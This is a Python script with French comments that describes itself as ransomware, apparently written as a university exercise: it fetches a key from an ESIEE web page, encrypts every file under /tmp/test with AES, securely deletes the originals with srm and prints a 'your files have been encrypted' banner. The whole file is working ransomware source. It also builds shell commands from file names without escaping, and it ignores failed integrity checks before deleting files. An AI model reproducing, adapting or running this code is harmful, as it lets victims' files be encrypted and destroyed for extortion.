# -*- coding: utf-8 -*-

from path import Path
from Crypto import Random
from Crypto.Cipher import AES
from Crypto.Hash import HMAC
from Crypto.Protocol.KDF import PBKDF2
import requests
import os
import sys
import pyfiglet
import argparse

parser = argparse.ArgumentParser(description="Ransomware qui peut chiffrer et déchiffrer l'intégralité du dossier /tmp en supprimant de façon sécurisée les fichiers d'origines.")
parser.add_argument("-d", "--dechiffre", type=str ,help="pour effectuéer le déchiffrement, il faut ajouter la clé en paramètre")
args = parser.parse_args()

def get_file(dossier='.'):
    #==========================================
    #Cette fonction permet de récupérer le path de 
    # l'ensemble des fichier présent dans le dossier
    # courant et tous les sous-dossiers
    #==========================================
    files = []
    #Parcours les fichiers
    for f in Path(dossier).walkfiles():
        files.append(f)
    return files

def get_key():
    #==========================================
    #Cette fonction permet de récupérer une clef
    # sur une page ESIEE
    #==========================================
    response = requests.get('https://perso.esiee.fr/~guillote/ransomware/')
    #Si la clef a été correctement récupérée
    if (response.status_code == requests.codes.ok):
        #On change le format de la page web pour enlever les ''
        return str(response.content)[1:].replace('\'', '')

def suppression(path):
    #==========================================
    #Cette fonction permet de supprimer de maniere 
    # securiser des fichiers avec la commande srm
    #==========================================

    for i in range(len(path)):
        os.system("srm -r " +"'"+path[i]+"'")


def chiffrement(fichiers,cle):
    #==========================================
    #Fonction qui va s'occuper du chiffrement 
    # avec AES-256 (quelque soit la taille du
    # mot de passe) en mode CFB de tous les fichiers
    # passé en paramètre avec la clé fournit.
    #==========================================
    sel     =   cle[::-1]
    kdf     =   PBKDF2(cle,sel,64, 1000)
    cle     =   kdf[:32]
    cle_mac =   kdf[32:]

    #Création du HMAC qui servira lors du déchiffrement
    mac = HMAC.new(cle_mac) #calculé par défautl en MD5

    for f in fichiers:
        #Génération de l'iv et du cipher pour chaque fichier
        iv = Random.get_random_bytes(16) 
        cipher = AES.new(cle, AES.MODE_CFB, iv)

        #Ouverture du fichier en mode lecture - binaire
        with open(f,'rb') as fin:
            #Chiffre le contenue lu dans le fichier
            chiffre = cipher.encrypt(fin.read())

        mac.update(iv+chiffre)

        #Création du fichier de sortie
        with open(f+'.pem','xb') as fout:
            fout.write(mac.digest())
            fout.write(iv)
            fout.write(chiffre)


def dechiffrement(fichiers,cle):
    #==========================================
    #Fonction qui va s'occuper du déchiffrement 
    # avec AES-256 (quelque soit la taille de la
    # clé) en mode CFB de tous les fichiers
    # passé en paramètre avec la clé fournit.
    #==========================================
    sel     =   cle[::-1]
    kdf     =   PBKDF2(cle,sel,64, 1000)
    cle     =   kdf[:32]
    cle_mac =   kdf[32:]

    #Création du HMAC pour vérifié l'intégrité du fichier chiffré
    mac = HMAC.new(cle_mac) #calculé par défautl en MD5

    for f in fichiers:
        #extraction des données du fichier chiffré
        with open(f,'rb') as fin:
            data    =   fin.read()

        #récupération du HMAC et génération du HMAC pour faire la conparaison
        verifie =   data[0:16]
        mac.update(data[16:])

        #Vérification de l'intégrité du fichier chiffré et le fait que la bonne clé a été fournit
        try:
            mac.verify(verifie)
        except ValueError:
            print("Abandon du déchiffrement, les fichiers ont été modifié après le chiffrement ou la clé n'est pas la bonne")

        iv      =   data[16:32]
        cipher  =   AES.new(cle,AES.MODE_CFB,iv)
        dechiffre   =   cipher.decrypt(data[32:])

        #Création du fichier déchiffré avec la bonne extension
        with open(f[:-4],'xb') as fout:
            fout.write(dechiffre)

def signature(text):
    #==========================================
    #Signature du ransomware.
    #==========================================
    result = pyfiglet.figlet_format(text, font = "isometric1")
    print(result)

def main():
    #==========================================
    #Fonction main du ransomware
    #==========================================
    if args.dechiffre == None:
        fichier = get_file('/tmp/test') #création de la table contenant tout les noms fichiers
        chiffrement(fichier,get_key())  #Chiffrement de tous les fichiers avec la clé récupéré
        suppression(fichier)           #Suppresion de tous les fichiers non chiffrés
        signature("Tous vos fichiers ont été chiffré")

    else:
        fichier =   get_file('/tmp/test')
        print(args.dechiffre)
        dechiffrement(fichier,args.dechiffre)
        suppression(fichier)


if __name__ == "__main__":
    main()